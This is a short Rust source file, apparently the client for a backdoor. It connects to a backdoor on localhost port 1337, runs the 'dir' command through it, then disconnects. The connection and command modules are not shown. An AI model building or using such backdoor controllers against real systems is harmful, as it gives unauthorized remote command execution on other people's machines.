use connection::connect_to_backdoor;
use std::net::Shutdown;

mod commanding;
mod commands;
mod connection;

fn main() {
    let mut stream = connect_to_backdoor("localhost:1337").unwrap();
    commands::run_command(String::from("dir"), &mut stream).unwrap();
    println!("Disconnecting from backdoor.");
    stream
        .shutdown(Shutdown::Both)
        .expect("Trying to shut down connecting with backdoor failed.");
}
